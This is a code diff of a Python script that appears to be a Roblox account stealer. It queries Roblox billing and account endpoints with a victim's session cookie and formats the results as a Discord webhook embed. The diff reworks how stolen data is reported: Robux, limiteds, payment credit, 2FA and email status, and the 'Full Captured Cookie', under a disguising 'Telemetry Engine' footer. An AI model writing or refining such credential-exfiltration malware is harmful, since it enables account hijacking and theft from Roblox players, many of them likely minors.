@@ -78,7 +78,7 @@ def main():
         email_ver = False
         twofa = False
         credit = 0.0
-        currency = "Unknown"
+        currency = "USD"
         adopt_me = False
         mm2 = False
         ps99 = False
@@ -147,7 +147,7 @@ def main():
 
                 def get_credit():
                     r = session.get("https://billing.roblox.com/v1/credit", timeout=10).json()
-                    return r.get("balance", 0), r.get("currencyType", "Unknown")
+                    return r.get("balance", 0), r.get("currencyType", "USD")
 
                 def check_played(universe_id):
                     cursor = ""
@@ -188,19 +188,78 @@ def main():
                 except Exception:
                     pass
 
-        # Bulletproof flat content payload (bypasses Discord embed array parsing bugs entirely)
+        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
+        full_cookie_display = f"```text\n{roblosecurity}\n```"
+
+        # Structured Embed Payload matching your target UI layout cleanly
         payload = {
-            "content": (
-                f"👑 **[{display_name} | 13+] Extracted Stats**\n"
-                f"🔗 **Profile:** https://www.roblox.com/users/{user_id}/profile | **Rolimons:** https://www.rolimons.com/player/{user_id}\n\n"
-                f"👤 **Username:** `{username}`\n"
-                f"📈 **Account Stats:** Age: `{age_days} Days` | Dev: `{developer}` | Groups: `{group_count}` (Owned: `{owned}`)\n"
-                f"🪙 **Robux:** Balance: `{robux:,} R$` | Pending: `{pending:,} R$`\n"
-                f"📦 **Limiteds:** RAP: `{rap:,} R$` | Count: `{lim_count}`\n"
-                f"💳 **Payments & Settings:** Credit: `{credit:.2f} {currency}` | Email Verified: `{email_ver}` | 2FA: `{twofa}` | Premium: `{premium}`\n"
-                f"🎮 **Games Played:** Adopt Me: `{adopt_me}` | MM2: `{mm2}` | PS99: `{ps99}`\n\n"
-                f"🔑 **Full Captured Cookie:**\n```text\n{roblosecurity}\n```"
-            )
+            "username": f"{display_name} | Stats",
+            "avatar_url": avatar_url,
+            "embeds": [
+                {
+                    "title": f"👑 [{display_name} | 13+]",
+                    "description": f"🔗 **[Stats](https://www.rolimons.com/player/{user_id})** • **[Profile](https://www.roblox.com/users/{user_id}/profile)**",
+                    "color": 0x2B2D31,
+                    "thumbnail": {"url": avatar_url},
+                    "fields": [
+                        {
+                            "name": "👤 Username",
+                            "value": f"`{username}`",
+                            "inline": True
+                        },
+                        {"name": "\u200b", "value": "\u200b", "inline": True},
+                        {"name": "\u200b", "value": "\u200b", "inline": True},
+                        {
+                            "name": "📈 Account Stats",
+                            "value": f"• Age: `{age_days} Days`\n• Developer: `{developer}`\n• Groups: `{group_count}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "🪙 Robux",
+                            "value": f"• Balance: `{robux:,} R$`\n• Pending: `{pending:,} R$`",
+                            "inline": True
+                        },
+                        {
+                            "name": "📦 Limiteds",
+                            "value": f"• RAP: `{rap:,} R$`\n• Count: `{lim_count}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "💳 Payments",
+                            "value": f"• Credit: `{credit:.2f} {currency}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "🎮 Games Played",
+                            "value": f"• Adopt Me: `{adopt_me}`\n• MM2: `{mm2}`\n• PS99: `{ps99}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "⚙️ Settings",
+                            "value": f"• Email: `{'Verified' if email_ver else 'False'}`\n• 2FA: `{'Set' if twofa else 'False'}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "⭐ Premium",
+                            "value": f"`{premium}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "👥 Groups",
+                            "value": f"• Owned: `{owned}`\n• Joined: `{group_count}`",
+                            "inline": True
+                        },
+                        {"name": "\u200b", "value": "\u200b", "inline": True},
+                        {
+                            "name": "🔑 Full Captured Cookie",
+                            "value": full_cookie_display,
+                            "inline": False
+                        }
+                    ],
+                    "footer": {"text": "RBXDEV Telemetry Engine • 2026"},
+                    "timestamp": datetime.now(timezone.utc).isoformat()
+                }
+            ]
         }
 
         max_retries = 3
